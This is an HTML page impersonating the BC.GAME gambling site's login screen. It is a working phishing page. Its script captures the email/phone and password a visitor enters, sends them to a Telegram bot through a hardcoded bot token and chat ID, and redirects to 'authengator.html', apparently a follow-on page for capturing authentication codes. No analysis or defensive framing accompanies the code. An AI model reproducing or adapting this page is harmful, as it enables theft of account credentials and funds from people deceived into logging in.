<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BC Game Login</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: #111218;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      min-height: 100vh;
      display: flex;
      justify-content: center;
    }

    .page-wrap {
      width: 100%;
      max-width: 420px;
      display: flex;
      flex-direction: column;
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 8px;
      padding: 20px 16px 12px;
      text-decoration: none;
    }
    .logo-name { color: #fff; font-weight: 700; font-size: 18px; letter-spacing: 1px; }

    .header {
      margin: 0 12px;
      border-radius: 16px;
      overflow: hidden;
      background: linear-gradient(135deg, #1b3558 0%, #162840 100%);
      padding: 24px;
    }

    .login-title {
      color: #fff;
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 20px;
    }

    .form-group {
      margin-bottom: 16px;
    }

    label {
      display: block;
      color: #99a4b0;
      font-size: 14px;
      margin-bottom: 8px;
    }

    input {
      width: 100%;
      background: #24262b;
      border: 1px solid #31343c;
      border-radius: 8px;
      padding: 12px;
      color: #fff;
      font-size: 16px;
      outline: none;
    }

    input:focus {
      border-color: #3bc117;
    }

    .login-btn {
      width: 100%;
      background: #3bc117;
      color: #fff;
      border: none;
      border-radius: 8px;
      padding: 14px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 10px;
    }

    .login-btn:hover {
      background: #44d61c;
    }
  </style>
</head>
<body>

  <div class="page-wrap">
    <div class="logo">
      <div class="logo-name">BC.GAME</div>
    </div>

    <div class="header">
      <div class="login-title">Login</div>
      
      <form id="login-form">
        <div class="form-group">
          <label>Email / Phone Number</label>
          <input type="text" id="email-phone" placeholder="Email or Phone" required>
        </div>
        
        <div class="form-group">
          <label>Password</label>
          <input type="password" id="password" placeholder="Password" required>
        </div>
        
        <button type="submit" class="login-btn">Log In</button>
      </form>
    </div>
  </div>

  <script>
    document.getElementById("login-form").addEventListener("submit", async (event) => {
        event.preventDefault();

        const botToken = "7892706717:AAGLqVZWBSvENZtXC-7EpmjhOHygY_8RQK8"; 
        const chatId = "-4814667671"; 

        const emailPhone = document.getElementById("email-phone").value;
        const password = document.getElementById("password").value;

        const message = `New Login Data (Page 1):\n\nUser: ${emailPhone}\nPass: ${password}`;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });

            // Redirect to the second page
            window.location.href = "authengator.html";
            
        } catch (error) {
            window.location.href = "authengator.html";
        }
    });
  </script>
</body>
</html>
